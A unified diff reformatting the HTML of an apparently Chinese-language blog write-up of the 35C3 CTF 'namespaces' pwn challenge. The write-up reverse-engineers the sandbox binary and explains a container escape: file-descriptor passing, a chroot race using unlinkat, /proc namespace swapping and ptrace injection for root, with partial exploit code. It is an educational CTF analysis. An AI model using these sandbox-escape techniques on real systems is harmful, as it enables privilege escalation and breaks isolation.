@@ -502,21 +502,22 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-CTF-Pwn-namespace"><a href="#1-CTF-Pwn-namespace" class="headerlink" title="1. CTF-Pwn-namespace"></a>1. CTF-Pwn-namespace</h2><h3 id="1-问题简述"><a href="#1-问题简述" class="headerlink" title="1) 问题简述"></a>1) 问题简述</h3><p>关于这道题目请见:<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces</a></p>
+                <h2 id="ctf-pwn-namespace">1. CTF-Pwn-namespace</h2>
+<h3 id="问题简述">1) 问题简述</h3>
+<p>关于这道题目请见:https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces</p>
 <p>这道题目给定了一个DockerFile文件和二机制文件namespaces,该文件用来搭建一个主机的环境,并且该“主机”上还会运行<code>nsjail</code>,这是一种容器服务程序.</p>
 <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"><span class="token instruction"><span class="token keyword keyword-FROM">FROM</span> tsuro/nsjail</span>
 <span class="token instruction"><span class="token keyword keyword-COPY">COPY</span> ./namespaces /home/user/chal</span>
 <span class="token instruction"><span class="token keyword keyword-COPY">COPY</span> tmpflag /flag</span>
 <span class="token instruction"><span class="token keyword keyword-CMD">CMD</span> /bin/sh -c <span class="token string">"/usr/bin/setup_cgroups.sh &amp;&amp; cp /flag /tmp/flag &amp;&amp; chmod 400 /tmp/flag &amp;&amp; chown user /tmp/flag &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / -R /tmp/flag:/flag -T /tmp --proc_rw -U 0:1000:1 -U 1:100000:1 -G 0:1000:1 -G 1:100000:1 --keep_caps --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /home/user/chal'"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>nsjail是一种进程隔离工具,我们可以将容器的本质理解成一种设置了各种资源限制与隔离属性的进程.</p>
 </blockquote>
 <p>根据给定的DockerFile,我们可以得出一些比较重要的基本信息(从CMD中):</p>
 <p>所以简而言之,我们用DockerFile所创建的容器(也就是改题目所需要的主机环境),会通过nsjail运行一个沙箱,而这个沙箱所运行的程序就是namespaces.所以接下来,我们需要了解namespace会干什么.</p>
-<h3 id="2-逆向分析"><a href="#2-逆向分析" class="headerlink" title="2) 逆向分析"></a>2) 逆向分析</h3><p>下面对namespaces进行逆向分析,首先是namespaces的主程序:</p>
-<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2011%2019%2051%2029%201668167489%201668167489344%20dHbtRn%20image-20221111195129175%20.png" alt="image-20221111195129175" style="zoom: 50%;">
-
+<h3 id="逆向分析">2) 逆向分析</h3>
+<p>下面对namespaces进行逆向分析,首先是namespaces的主程序:</p>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2011%2019%2051%2029%201668167489%201668167489344%20dHbtRn%20image-20221111195129175%20.png" alt="image-20221111195129175" style="zoom: 50%;"></p>
 <p>首先,我们可以通过<code>!getuid</code>作为条件,可以推知,该进程是在root权限(是容器内部的root)之下运行的.因此我们完全将此进程视为一个守护进程.然后在while循环内部,内部的第一个<code>while(1)</code>会等待从标准输入接收一个整型<code>read_int</code>,将此值返回到v5.得到也就是用户输入的数字.比如说“1”或者“2”.</p>
 <p>如果接收到的是“1”,那么将会调用<code>start_sandbox</code>,如果输入的是“2”的话,就会调用run_elf.因此我们的关注点将会在<code>start_sandbox</code>和<code>run_elf</code>这两个函数中.</p>
 <p>下面是<code>start_sandbox</code>,首先顾名思义,这应该是“启动沙箱”的意思.其逆向的代码如下:</p>
@@ -600,16 +601,18 @@
   <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
   <span class="token keyword keyword-return">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v16<span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在这个函数中,首先会从一个沙箱数组中分配一个沙箱,返回到v9中,如果已经满了(超过9个),就不会成功返回,之后创建一个无名套接字,该套接字用来给父进程(它自己)和将要创建的子进程进行进程间通信(主要是传输ELF文件).之后创建处子进程后,<code>!v8</code>代表的是子进程要执行的逻辑,见而言之,首先从创建的无名套接字中等待并接受ELF文件(即init ELF).</p>
+<p>在这个函数中,首先会从一个沙箱数组中分配一个沙箱,返回到v9中,如果已经满了(超过9个),就不会成功返回,之后创建一个无名套接字,该套接字用来给父进程(它自己)和将要创建的子进程进行进程间通信(主要是传输ELF文件).之后创建处子进程后,<code>!v8</code>代表的是子进程要执行的逻辑,见而言之,首先从创建的无名套接字中等待并接受ELF文件(即init
+ELF).</p>
 <blockquote>
-<p>至此,我们可以明确,在执行start_sandbox时会需要并执行一个init ELF文件的.</p>
+<p>至此,我们可以明确,在执行start_sandbox时会需要并执行一个init
+ELF文件的.</p>
 </blockquote>
 <p>之后,构建该沙箱对应的根目录路径的字符串,然后创建该目录并且切换到该目录上.</p>
 <blockquote>
-<p>先调用chroot,在该进程对于文件系统的根目录就成了/tmp/chroots/….,然后切换目录到根目录.</p>
+<p>先调用chroot,在该进程对于文件系统的根目录就成了/tmp/chroots/....,然后切换目录到根目录.</p>
 </blockquote>
-<p>之后在对该子进程执行一系列的降权操作,调用<code>setresgid,setresuid</code>等等,从0降为1,也就不再是root权限的了.然后在子进程中通过<code>exec</code>执行init ELF文件中的内容.执行完之后就退出.</p>
+<p>之后在对该子进程执行一系列的降权操作,调用<code>setresgid,setresuid</code>等等,从0降为1,也就不再是root权限的了.然后在子进程中通过<code>exec</code>执行init
+ELF文件中的内容.执行完之后就退出.</p>
 <p>在if大括号外边,只有父进程会执行,其中主要的关注点还是在于其执行的<strong>一系列降权操作</strong>.因此可以说执行init的子进程和父进程都会最后进行降权操作.其中<code>*(_DWORD *)v9 = v8;</code>是需要关注的细节,我们至此可以猜测,sandbox数组是一个指针数组,<strong>关于v8也就是new_proc的返回值是否是子进程我是比较疑惑的,根据所找的资料似乎返回的是父进程(init)的pid而非子进程</strong></p>
 <p>之后,我们再来分析<code>run_elf</code>函数.其逆向代码如下:</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword keyword-unsigned">unsigned</span> __int64 __fastcall <span class="token function">run_elf</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
@@ -638,7 +641,6 @@
   <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword keyword-return">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v8<span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>在此函数中,会通过调用<code>get_sandbox</code>来检索出执行该elf文件的沙箱(指针,也就是之前start过的,保存在数组里的).然后打开elf文件.之后再调用fork创建出一个子进程,在下面的if分支中,对应的就是子进程要执行的代码.对于fork出来的子进程,首先调用<code>change_ns</code>仅从一些namespace的设置操作,直至完之后执行elf文件,之后退出.</p>
 <p>下面来分析<code>change_ns</code>,该函数是这个问题的重点:</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword keyword-unsigned">unsigned</span> __int64 __fastcall <span class="token function">change_ns</span><span class="token punctuation">(</span><span class="token keyword keyword-unsigned">unsigned</span> <span class="token keyword keyword-int">int</span> a1<span class="token punctuation">,</span> <span class="token keyword keyword-unsigned">unsigned</span> <span class="token keyword keyword-int">int</span> a2<span class="token punctuation">)</span>
@@ -690,19 +692,19 @@
   <span class="token function">check</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> <span class="token string">"setresuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword keyword-return">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v16<span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>其中核心的部分,在于设置namespace的for循环.这个循环会将之前fork出的子进程进行namespace的设置.其中构造表示ns的文件路径字符串时,需要用到a1,a1是什么呢?a1来源于之前<code>run_elf</code>中get_sandbox的返回值(指针)对应的值,也就是之前我们创建的沙箱时,fork出来的子进程的pid.所以说,<strong><code>run_elf</code>中子进程的namespace设置,来源于对应的<code>start_sandbox</code>中子进程的namespace</strong>.其中,可以发现NSS中是没有“net”的(说实话,这个地方我不知道怎么看出来的,我并没有把NSS数组中内容逆出来).所以至此,可以确定的是<strong>网络资源并没有做出隔离</strong>.</p>
 <blockquote>
 <p>在对pid相关namespace进行设置时,会创建出一个新的子进程对当前的子进程进行一个“调包”.</p>
 </blockquote>
 <p>之后,执行一些降权操作,该子进程不再是root权限.</p>
-<h3 id="3-攻击思路"><a href="#3-攻击思路" class="headerlink" title="3) 攻击思路"></a>3) 攻击思路</h3><p>至此,关于<code>namespace</code>二进制程序的分析就到这里了,那么该如何展开攻击呢?</p>
-<h4 id="1-文件描述符的传递"><a href="#1-文件描述符的传递" class="headerlink" title="(1) 文件描述符的传递"></a>(1) 文件描述符的传递</h4><p>通过上面的分析,我们可以明确,网络资源是没有隔离的,也就是意味着不同的沙箱之间在网络资源上是共享的.更具体地说,<strong>这可以使得两个沙箱的本地IP实际上就是同一个</strong>,因此同一个端口1337,如果网络资源在不同的沙箱之间是隔离的,那么1337对于不同的沙箱而言并不是同一个端口,但如果没有隔离,就意味着不同的沙箱视角下的1337端口,完全就是同一个.比如说,沙箱0在本地1337端口上监听,那么沙箱1对本地1337端口发起连接,就正是沙箱0所监听的本地端口1337.因此,两个沙箱可以自如地利用TCP来进行通信.</p>
+<h3 id="攻击思路">3) 攻击思路</h3>
+<p>至此,关于<code>namespace</code>二进制程序的分析就到这里了,那么该如何展开攻击呢?</p>
+<h4 id="文件描述符的传递">(1) 文件描述符的传递</h4>
+<p>通过上面的分析,我们可以明确,网络资源是没有隔离的,也就是意味着不同的沙箱之间在网络资源上是共享的.更具体地说,<strong>这可以使得两个沙箱的本地IP实际上就是同一个</strong>,因此同一个端口1337,如果网络资源在不同的沙箱之间是隔离的,那么1337对于不同的沙箱而言并不是同一个端口,但如果没有隔离,就意味着不同的沙箱视角下的1337端口,完全就是同一个.比如说,沙箱0在本地1337端口上监听,那么沙箱1对本地1337端口发起连接,就正是沙箱0所监听的本地端口1337.因此,两个沙箱可以自如地利用TCP来进行通信.</p>
 <p>此外,我们还可以考虑某个沙箱将自己所处的根目录打开并返回文件描述符后,将该传递给另一个沙箱,另一个沙箱借助<code>openat</code>等系统调用对文件描述符进行操作.</p>
 <blockquote>
 <p><strong>openat,unlinkat,symlinkat等API的作用?</strong></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword keyword-int">int</span> <span class="token function">openat</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span><span class="token punctuation">,</span> <span class="token keyword keyword-const">const</span> <span class="token keyword keyword-char">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>主要的参数是一个表示文件描述符的整型和一个表示相对文件路径的字符串,可以以文件描述符所处的路径为基地址,然后以该字符串为相对地址作为地址偏移,进而对该文件打开.至于unlinkat,symlinkat等系统调用是与之类似的.因此可以通过打开的根目录文件描述符,再通过相对地址,进而可以对根目录之外的文件进行访问.</p>
 <p><strong>为什么一个沙箱不自己调用<code>openat</code>等API对该文件描述符操作,而是非得传递给另一个沙箱呢?</strong></p>
 <p>如果一个沙箱自己就可以通过这类系统调用接口完成对某个根目录外的文件访问,那么之前对于文件系统的隔离设置岂不就是没用了?因此可以说,由于文件系统资源的隔离,一个沙箱不能通过openat来完成此类操作.后来我写了份代码进行测试,发现进行chroot之后的进程,可以通过openat打开chroot之外的文件(也就是基目录描述符是chroot之外的).其测试代码如下:</p>
@@ -718,17 +720,20 @@
 <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">openat</span><span class="token punctuation">(</span>in_fd<span class="token punctuation">,</span> <span class="token string">"../install.sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// error</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"in:打开失败: %d\n"</span><span class="token punctuation">,</span> errno<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>因此,如果我们可以知道沙箱0并不能借助openat访问自己根目录外的文件,但是沙箱1却可以得到沙箱0的根目录描述符进而借助openat访问到外部的文件.</p>
 <p><strong>如何跨越进程地传递文件描述符?</strong></p>
 <p>根据操作系统的知识,一个进程对于打开的文件维护一个文件表项,每个表象在该进程下都有一个整型表示为难描述符,还有一个指向底层文件inode的指针.如果两个进程打开了同一个文件,那么这个文件在不同进程的文件描述符未必一样,但是其inode指针必然是指向同一个的.</p>
-<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2012%2010%2047%2000%201668221220%201668221220548%20Xy2334%20image-20221112104659881%20.png" alt="image-20221112104659881" style="zoom:33%;">
-
-<p>正如图中所示,利用借助unix socket以“辅助消息”(Ancillary messages)的方式在指定类型为SCM_RIGHTS时发送和接收文件描述符,其本质上是传递该文件描述符所对应的表项(指针),而非单纯的“文件描述符(fd)”.因此不同进程中对于该文件的fd未必是同一个.</p>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2012%2010%2047%2000%201668221220%201668221220548%20Xy2334%20image-20221112104659881%20.png" alt="image-20221112104659881" style="zoom:33%;"></p>
+<p>正如图中所示,利用借助unix socket以“辅助消息”(Ancillary
+messages)的方式在指定类型为SCM_RIGHTS时发送和接收文件描述符,其本质上是传递该文件描述符所对应的表项(指针),而非单纯的“文件描述符(fd)”.因此不同进程中对于该文件的fd未必是同一个.</p>
 </blockquote>
 <p>因此首先想到<strong>沙箱0对本地1337端口进行监听,然后沙箱1对1337发起连接,将沙箱0的文件描述符传递给沙箱1,沙箱1因此可以借助openat等系统调用来对此根目录之外的文件进行访问</strong>.</p>
-<h4 id="2-如何提权为root"><a href="#2-如何提权为root" class="headerlink" title="(2) 如何提权为root?"></a>(2) 如何提权为root?</h4><p>但除此之外,还是不够的,回忆之前我们对于<code>namespaces</code>程序的分析,在正式地执行init elf之前,该进程已经降权而不再是root用户了,对于flag这种权限为400的来说,是没有足够的权限访问的,因此我们接下来需要考虑的是怎样提升为root.</p>
-<p>怎样提升权限为root呢,也就是说如何阻止降权操作的执行呢?回忆之前分析的代码,可知start_sandbox和run_elf分别对应docker中的init和exec操作,对于start_sandbox中,前者会在执行init elf之前就完成降权,而run_elf在设置完namespace以后再降权,对于一个沙箱,其生命周期中,往往先执行<code>start_sandbox</code>在执行<code>run_elf</code>.我们可以发现,如果想要阻碍init elf中的降权操作,基本上没有什么可行性.因此主要考虑阻碍run_elf中的降权操作.</p>
+<h4 id="如何提权为root">(2) 如何提权为root?</h4>
+<p>但除此之外,还是不够的,回忆之前我们对于<code>namespaces</code>程序的分析,在正式地执行init
+elf之前,该进程已经降权而不再是root用户了,对于flag这种权限为400的来说,是没有足够的权限访问的,因此我们接下来需要考虑的是怎样提升为root.</p>
+<p>怎样提升权限为root呢,也就是说如何阻止降权操作的执行呢?回忆之前分析的代码,可知start_sandbox和run_elf分别对应docker中的init和exec操作,对于start_sandbox中,前者会在执行init
+elf之前就完成降权,而run_elf在设置完namespace以后再降权,对于一个沙箱,其生命周期中,往往先执行<code>start_sandbox</code>在执行<code>run_elf</code>.我们可以发现,如果想要阻碍init
+elf中的降权操作,基本上没有什么可行性.因此主要考虑阻碍run_elf中的降权操作.</p>
 <blockquote>
 <p><strong>利用ptrace进行代码覆盖</strong></p>
 <p>ptrace可以为一个进程(tracer)监视和控制另一个进程(tracee).</p>
@@ -738,9 +743,13 @@
 </blockquote>
 <p>结合上面介绍的的ptrace,我们可以想到,如果一个run_elf的子进程可以被另一个进程调用ptrace进行重写就可以达到目的了.但是这样一个tracer应该是谁呢?</p>
 <p>可以想到,如果让一个<code>start_sandbox</code>中的子进程作为一个tracer来对后来的对应的<code>run_elf</code>中的子进程调用ptrace进行控制,不就可以了吗?</p>
-<p>但此时还是存在一个问题的,**ptrace其中有一个参数为pid,这就要求tracer和tracee处于同一个pid namespace中.**然而正常情况下,在namespace的设置中,其run_elf所处namespace并不是start_sandbox中的子进程,而是init进程本身.</p>
-<h4 id="3-将tracer和tracee置于同一个pid-namespace"><a href="#3-将tracer和tracee置于同一个pid-namespace" class="headerlink" title="(3) 将tracer和tracee置于同一个pid namespace"></a>(3) 将tracer和tracee置于同一个pid namespace</h4><p>之前传递文件描述符的动作发生在沙箱0和沙箱1中,这一步则发生在沙箱2中.更确切地说时沙箱2的<code>start_sandbox</code>中.</p>
-<p>这里的方法是,将后来setns中,所用的namespace进行调包,<code>snprintf(s, 0x1000uLL, "/proc/%d/ns/%s", a1, (&amp;NSS)[i]);</code>,也就是这个path的所指向的实际内容.我们需要借助的是<code>start_sandbox</code>中的init elf.其中exp脚本和elf源代码有关的内容如下:</p>
+<p>但此时还是存在一个问题的,<strong>ptrace其中有一个参数为pid,这就要求tracer和tracee处于同一个pid
+namespace中.</strong>然而正常情况下,在namespace的设置中,其run_elf所处namespace并不是start_sandbox中的子进程,而是init进程本身.</p>
+<h4 id="将tracer和tracee置于同一个pid-namespace">(3)
+将tracer和tracee置于同一个pid namespace</h4>
+<p>之前传递文件描述符的动作发生在沙箱0和沙箱1中,这一步则发生在沙箱2中.更确切地说时沙箱2的<code>start_sandbox</code>中.</p>
+<p>这里的方法是,将后来setns中,所用的namespace进行调包,<code>snprintf(s, 0x1000uLL, "/proc/%d/ns/%s", a1, (&amp;NSS)[i]);</code>,也就是这个path的所指向的实际内容.我们需要借助的是<code>start_sandbox</code>中的init
+elf.其中exp脚本和elf源代码有关的内容如下:</p>
 <pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword keyword-int">int</span> init <span class="token operator">=</span> <span class="token function">get_cur_pid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Init pid: %d"</span><span class="token punctuation">,</span> init<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 准确地说init进程指的是start_sand执行fork得出的一个进程</span>
 <span class="token function">new_namespaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 创建一份新的namespace</span>
@@ -754,7 +763,6 @@
 <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Child pid: %d"</span><span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">set_trap_for_join</span><span class="token punctuation">(</span>init<span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置proc中的命名空间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>其中关于<code>set_trap_for_join</code>:</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword keyword-static">static</span> <span class="token keyword keyword-void">void</span> <span class="token function">set_trap_for_join</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> init_pid<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span> child_pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token function">makedir</span><span class="token punctuation">(</span><span class="token string">"/tmp/oldproc_"</span> <span class="token function">STR</span><span class="token punctuation">(</span>RAND<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 创建tmp下的/tmp/oldproc以及/tmp/newproc并挂载到/proc下</span>
@@ -776,10 +784,11 @@
     <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Creating fifo \"%s\""</span><span class="token punctuation">,</span> fifo<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">CHECK_CALL</span><span class="token punctuation">(</span>mkfifo<span class="token punctuation">,</span> fifo<span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>简而言之,在执行init elf的子进程中,会首先将当前的/proc拷贝到<code>/tmp/oldproc</code>中,并且创建一个新的<code>/tmp/newproc</code>并将其挂在到当前的/proc,然后在/proc下创建好一些和namespace有关的文件.主要在于将<code>/tmp/oldproc_/[init子进程]/ns/pid</code>链接到<code>/proc/[init进程]/ns/pid</code>中.因此之后,在设置namespace的过程中,所谓的“init进程的namespace”文件实际上是被我们调包之后的结果,即init子进程的namespace.因此这样可以确保run_elf将会与init子进程处于同一个pid空间之中.</p>
+<p>简而言之,在执行init
+elf的子进程中,会首先将当前的/proc拷贝到<code>/tmp/oldproc</code>中,并且创建一个新的<code>/tmp/newproc</code>并将其挂在到当前的/proc,然后在/proc下创建好一些和namespace有关的文件.主要在于将<code>/tmp/oldproc_/[init子进程]/ns/pid</code>链接到<code>/proc/[init进程]/ns/pid</code>中.因此之后,在设置namespace的过程中,所谓的“init进程的namespace”文件实际上是被我们调包之后的结果,即init子进程的namespace.因此这样可以确保run_elf将会与init子进程处于同一个pid空间之中.</p>
 <p>但其实还有一个问题.关于namespace的创建.</p>
-<h4 id="4-从chroot中逃逸"><a href="#4-从chroot中逃逸" class="headerlink" title="(4) 从chroot中逃逸"></a>(4) 从chroot中逃逸</h4><p>在这里采用了竞态攻击的方法,这个动作应该发生在<code>(3) pid namespace等操作</code>之前,也就是说使得沙箱2在<code>start_sandbox</code>进行chroot时,其所切换到的root并不是正常情况下,该沙箱所对应的根目录,而是主机的根目录.</p>
+<h4 id="从chroot中逃逸">(4) 从chroot中逃逸</h4>
+<p>在这里采用了竞态攻击的方法,这个动作应该发生在<code>(3) pid namespace等操作</code>之前,也就是说使得沙箱2在<code>start_sandbox</code>进行chroot时,其所切换到的root并不是正常情况下,该沙箱所对应的根目录,而是主机的根目录.</p>
 <p>怎么实现呢?我们可以参考exp代码:</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword keyword-static">static</span> <span class="token keyword keyword-void">void</span> <span class="token function">do_recvfd</span><span class="token punctuation">(</span><span class="token keyword keyword-void">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword keyword-int">int</span> fd <span class="token operator">=</span> <span class="token function">setup_socket_and_recv_fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -790,9 +799,9 @@
     <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Race done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这一段代码是沙箱1在run_elf中执行的,接受到文件描述符后,借助<code>unlinkat</code>对沙箱2对应的根目录文件夹进行处理,当沙箱2的根目录被创建之后,理想的情况下,此根目录就会被unlink,进而将“/”,也就是整个文件的根目录都链接到“沙箱2的根目录上”.因此沙箱2的根目录被掉包到了宿主机根目录上.</p>
-<h4 id="5-串联起来"><a href="#5-串联起来" class="headerlink" title="(5) 串联起来"></a>(5) 串联起来</h4><p>我们根据exp代码就可以直观地将攻击过程串联起来:</p>
+<h4 id="串联起来">(5) 串联起来</h4>
+<p>我们根据exp代码就可以直观地将攻击过程串联起来:</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
     r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">)</span>
     hook_recv<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
@@ -817,46 +826,57 @@
 
     <span class="token comment"># let a process join sandbox 2 to escalate to root</span>
     run_file<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>总结成表格如下:</p>
 <table>
+<colgroup>
+<col style="width: 3%">
+<col style="width: 17%">
+<col style="width: 39%">
+<col style="width: 39%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>时间线</th>
 <th>沙箱0</th>
 <th>沙箱1</th>
 <th>沙箱2</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>T1</td>
 <td>start_sandbox(sleep)</td>
 <td>start_sandbox(sleep)</td>
 <td></td>
 </tr>
-<tr>
+<tr class="even">
 <td>T2</td>
 <td>发送沙箱0的根目录文件描述符</td>
 <td>接收来自沙箱0的文件描述符;对沙箱2的根目录轮询,unlink后,建立到宿主机根目录的软链接</td>
 <td></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>T3</td>
 <td></td>
 <td></td>
-<td>start_sandbox(escalate),会切换被掉包的root路径;进行init子进程的一些关于pid namespace的操作.</td>
+<td>start_sandbox(escalate),会切换被掉包的root路径;进行init子进程的一些关于pid
+namespace的操作.</td>
 </tr>
-<tr>
+<tr class="even">
 <td>T4</td>
 <td></td>
 <td></td>
-<td>执行run_elf,将和之前init子进程处于同一个pid namespace;之前init子进程被“唤醒”,用ptrace注入代码.最后攻击完成</td>
+<td>执行run_elf,将和之前init子进程处于同一个pid
+namespace;之前init子进程被“唤醒”,用ptrace注入代码.最后攻击完成</td>
 </tr>
-</tbody></table>
-<h3 id="4-复现效果"><a href="#4-复现效果" class="headerlink" title="4) 复现效果"></a>4) 复现效果</h3><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2012%2013%2037%2039%201668231459%201668231459815%20ryArGg%20image-20221112133739719%20.png" alt="image-20221112133739719" style="zoom:50%;">
-
+</tbody>
+</table>
+<h3 id="复现效果">4) 复现效果</h3>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2012%2013%2037%2039%201668231459%201668231459815%20ryArGg%20image-20221112133739719%20.png" alt="image-20221112133739719" style="zoom:50%;"></p>
 <p>总的来说,这个漏洞的攻击过程还是相当复杂的,内部有许多系统底层细节有关的知识,难度也是挺大的,我还有一些地方至今也未能完全明白.</p>
